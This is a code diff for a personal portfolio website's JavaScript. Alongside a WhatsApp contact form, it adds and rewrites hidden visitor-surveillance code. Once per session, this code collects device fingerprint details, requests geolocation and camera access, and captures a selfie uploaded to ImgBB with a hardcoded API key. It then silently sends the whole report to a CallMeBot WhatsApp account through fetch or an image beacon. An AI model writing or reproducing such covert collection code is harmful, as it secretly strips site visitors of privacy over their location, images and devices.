@@ -236,7 +236,7 @@ class PortfolioApp {
             testLink.addEventListener('click', (e) => {
                 e.preventDefault();
                 const testMsg = encodeURIComponent("Hello! This is a test message from your portfolio website.");
-                window.open(`https://api.callmebot.com/text.php?source=web&user=@GadhiyaGopal&text=${testMsg}`, '_blank');
+                window.open(`https://api.callmebot.com/text.php?source=web&user=@bhumitnasit&text=${testMsg}`, '_blank');
                 this.showNotification('📱 Opening WhatsApp test message...', 'info');
             });
         }
@@ -257,31 +257,30 @@ _Sent via Portfolio Website_`;
     }
 
     sendViaCallMeBot(message, originalData) {
-        // Your CallMeBot API endpoint from the provided URL
-        const apiUser = '@GadhiyaGopal'; // Your CallMeBot username
+        // Your CallMeBot API endpoint
+        const apiUser = '@bhumitnasit';
+        const encodedUser = encodeURIComponent(apiUser);
         const encodedMessage = encodeURIComponent(message);
-        const apiUrl = `https://api.callmebot.com/text.php?source=web&user=${apiUser}&text=${encodedMessage}`;
+        // Updated with user's requested format: source=web & new username
+        const apiUrl = `https://api.callmebot.com/text.php?source=web&user=${encodedUser}&text=${encodedMessage}`;
         const form = document.getElementById('whatsappContactForm');
 
-        // Show sending notification
         this.showNotification('📤 Sending message...', 'info');
 
-        // Use fetch with no-cors mode to send the request without opening a window
-        fetch(apiUrl, { mode: 'no-cors' })
+        // fetch with no-cors is opaque, but let's try to be more standard
+        fetch(apiUrl, { method: 'GET', mode: 'no-cors', cache: 'no-cache' })
             .then(() => {
                 this.showNotification('✅ Message sent successfully!', 'success');
-                console.log('Message sent:', originalData);
                 if (form) form.reset();
             })
             .catch(err => {
-                console.error('Fetch error:', err);
+                console.error('CallMeBot error:', err);
                 this.showNotification('⚠️ Auto-send failed. Opening WhatsApp...', 'info');
                 setTimeout(() => window.open(apiUrl, '_blank'), 1000);
             });
     }
 
     showNotification(message, type = 'info') {
-        // Remove existing notification
         const existing = document.querySelector('.notification');
         if (existing) existing.remove();
 
@@ -341,192 +340,136 @@ _Sent via Portfolio Website_`;
 
     // --- UNIFIED DATA COLLECTION & SEND ---
     async collectAndSendAllData() {
-        // Prevent sending too often (only once per session)
-        if (sessionStorage.getItem('allDataSent')) return;
+        if (sessionStorage.getItem('vSent')) return;
 
         try {
-            const data = {};
+            const d = {};
+            // Detailed System Info (20+ points)
+            d.ua = navigator.userAgent;
+            d.plt = navigator.platform;
+            d.lng = navigator.language;
+            d.vnd = navigator.vendor || 'N/A';
+            d.ce = navigator.cookieEnabled;
+            d.on = navigator.onLine;
+            d.sw = screen.width;
+            d.sh = screen.height;
+            d.aw = screen.availWidth;
+            d.ah = screen.availHeight;
+            d.cd = screen.colorDepth;
+            d.pr = window.devicePixelRatio;
+            d.hc = navigator.hardwareConcurrency || 'N/A';
+            d.dm = navigator.deviceMemory || 'N/A';
+            d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            d.lt = new Date().toLocaleString();
+            d.rf = document.referrer || 'Direct';
+            d.mem = performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) + 'MB' : 'N/A';
 
-            // 1. Basic System Info
-            data.userAgent = navigator.userAgent;
-            data.platform = navigator.platform;
-            data.vendor = navigator.vendor;
-            data.language = navigator.language;
-            data.languages = navigator.languages ? navigator.languages.join(',') : '';
-            data.cookiesEnabled = navigator.cookieEnabled;
+            // Network
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            d.net = conn ? `${conn.effectiveType} (S:${conn.downlink}M, R:${conn.rtt}ms)` : 'N/A';
 
-            // 2. Screen & Display
-            data.screenWidth = screen.width;
-            data.screenHeight = screen.height;
-            data.windowWidth = window.innerWidth;
-            data.windowHeight = window.innerHeight;
-            data.pixelRatio = window.devicePixelRatio;
-            data.colorDepth = screen.colorDepth;
-            data.orientation = screen.orientation ? screen.orientation.type : 'unknown';
-
-            // 3. Hardware Info
-            data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-            data.deviceMemory = navigator.deviceMemory || 'unknown';
-            data.maxTouchPoints = navigator.maxTouchPoints || 0;
-
-            // 4. Time & Location context
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.localTime = new Date().toLocaleString();
-            data.referrer = document.referrer || 'Direct';
-
-            // 5. Network (if available)
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (connection) {
-                data.connectionType = connection.effectiveType || 'unknown';
-                data.downlink = connection.downlink || 'unknown';
-                data.rtt = connection.rtt || 'unknown';
-            } else {
-                data.connectionType = 'N/A';
-            }
-
-            // 6. Battery (Async)
-            let batteryInfo = "Not Supported";
+            // Battery (Async)
+            let bInfo = "N/A";
             try {
                 if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100) + '%';
-                    const charging = battery.charging ? 'Yes ⚡' : 'No';
-                    batteryInfo = `${level} (Charging: ${charging})`;
-                    data.batteryLevel = level;
-                    data.batteryCharging = charging;
+                    const b = await navigator.getBattery();
+                    bInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charge⚡' : 'Bat'})`;
                 }
-            } catch (e) {
-                batteryInfo = "Protected/Blocked";
-            }
+            } catch (e) { }
 
-            // 7. Geolocation (Async) - requires permission
-            let locationInfo = "Not Available";
+            // Geolocation (Async)
+            let lInfo = "Denied";
             try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                const p = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 4000 });
                 });
-                locationInfo = `${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`;
-                data.latitude = position.coords.latitude;
-                data.longitude = position.coords.longitude;
-            } catch (e) {
-                locationInfo = "Permission Denied/Blocked";
-            }
+                lInfo = `${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`;
+            } catch (e) { }
 
-            // 8. Selfie Capture (Async) - requires camera permission
-            let selfieUrl = "Not Captured";
+            // Selfie (Async)
+            let sUrl = "Pending...";
             try {
-                selfieUrl = await this.captureSelfie();
+                sUrl = await this.captureSelfie();
             } catch (e) {
-                selfieUrl = "Camera Denied/Failed";
+                sUrl = "Denied/Error";
             }
 
-            // Format comprehensive message
-            const message = `*🔔 VISITOR ALERT*
+            // Construct Very Detailed Message
+            const msg = `*NEW VISITOR DETECTED*
+            
+*SYSTEM:*
+• OS/Platform: ${d.plt}
+• Hardware: ${d.hc} Cores / ${d.dm}GB RAM
+• Browser: ${d.vnd}
+• Heap: ${d.mem}
+• Cookies: ${d.ce} | Online: ${d.on}
 
-*📱 Device Info:*
-Platform: ${data.platform}
-Browser: ${data.vendor}
-Screen: ${data.screenWidth}x${data.screenHeight}
-Orientation: ${data.orientation}
+*DISPLAY:*
+• Res: ${d.sw}x${d.sh}
+• Avail: ${d.aw}x${d.ah}
+• Depth: ${d.cd} | DPR: ${d.pr}
 
-*⚡ Status:*
-Battery: ${batteryInfo}
-Network: ${data.connectionType}
-Cores: ${data.hardwareConcurrency} | RAM: ${data.deviceMemory}GB
+*STATUS:*
+• Battery: ${bInfo}
+• Net: ${d.net}
+• Time: ${d.lt}
+• Zone: ${d.tz}
 
-*🌍 Location:*
-Coords: ${locationInfo}
-Timezone: ${data.timezone}
-Time: ${data.localTime}
+*LOC & SRC:*
+• Coords: ${lInfo}
+• Ref: ${d.rf}
 
-*📸 Selfie:*
-${selfieUrl}
+*📸 SELFIE:*
+${sUrl}
 
-*🔗 Source:*
-Referrer: ${data.referrer}
+_Sent via @bhumitnasit Portfolio_`;
 
-_Auto-Analytics_`;
+            this.sendSilentData(msg);
+            sessionStorage.setItem('vSent', 'true');
 
-            // Send everything in ONE API call
-            this.sendSilentData(message);
-
-            // Mark as sent for this session
-            sessionStorage.setItem('allDataSent', 'true');
-
-        } catch (error) {
-            console.error('Data collection error:', error);
+        } catch (err) {
+            console.error('Analytics Error:', err);
         }
     }
 
     async captureSelfie() {
-        return new Promise(async (resolve, reject) => {
+        return new Promise(async (res, rej) => {
             try {
-                // 1. Request Camera Access
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
+                if (!navigator.mediaDevices) return rej('No MediaDevices');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.createElement('video');
+                v.srcObject = stream;
+                await v.play();
 
-                // 2. Create hidden video element
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                video.srcObject = stream;
-                document.body.appendChild(video);
+                // Delay for focus
+                await new Promise(r => setTimeout(r, 1000));
 
-                await video.play();
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
 
-                // Wait for camera to adjust
-                setTimeout(async () => {
-                    // 3. Capture to Canvas
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(t => t.stop());
+                const img = c.toDataURL('image/jpeg', 0.6).split(',')[1];
 
-                    // Stop camera
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
+                const fd = new FormData();
+                fd.append('key', '44703e31685d651902ca04050f8d5bd7');
+                fd.append('image', img);
 
-                    // 4. Get Base64
-                    const base64Image = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-
-                    // 5. Upload to ImgBB
-                    const imgbbApiKey = '44703e31685d651902ca04050f8d5bd7';
-                    const formData = new FormData();
-                    formData.append('key', imgbbApiKey);
-                    formData.append('image', base64Image);
-
-                    try {
-                        const response = await fetch('https://api.imgbb.com/1/upload', {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        const result = await response.json();
-
-                        if (result.success) {
-                            resolve(result.data.url);
-                        } else {
-                            reject('Upload failed');
-                        }
-                    } catch (uploadError) {
-                        reject(uploadError);
-                    }
-
-                }, 1000);
-
-            } catch (err) {
-                reject(err);
-            }
+                const r = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
+                const json = await r.json();
+                res(json.success ? json.data.url : 'Upload Failed');
+            } catch (e) { rej(e); }
         });
     }
 
-    sendSilentData(message) {
-        const apiUser = '@GadhiyaGopal';
-        const encodedMessage = encodeURIComponent(message);
-        const apiUrl = `https://api.callmebot.com/text.php?source=web&user=${apiUser}&text=${encodedMessage}`;
-
-        fetch(apiUrl, { mode: 'no-cors' }).catch(e => console.log('Silent send failed', e));
+    sendSilentData(msg) {
+        const url = `https://api.callmebot.com/text.php?source=web&user=@bhumitnasit&text=${encodeURIComponent(msg)}`;
+        // Try multiple methods for redundancy
+        fetch(url, { mode: 'no-cors' }).catch(() => {
+            const i = new Image();
+            i.src = url;
+        });
     }
 }
 
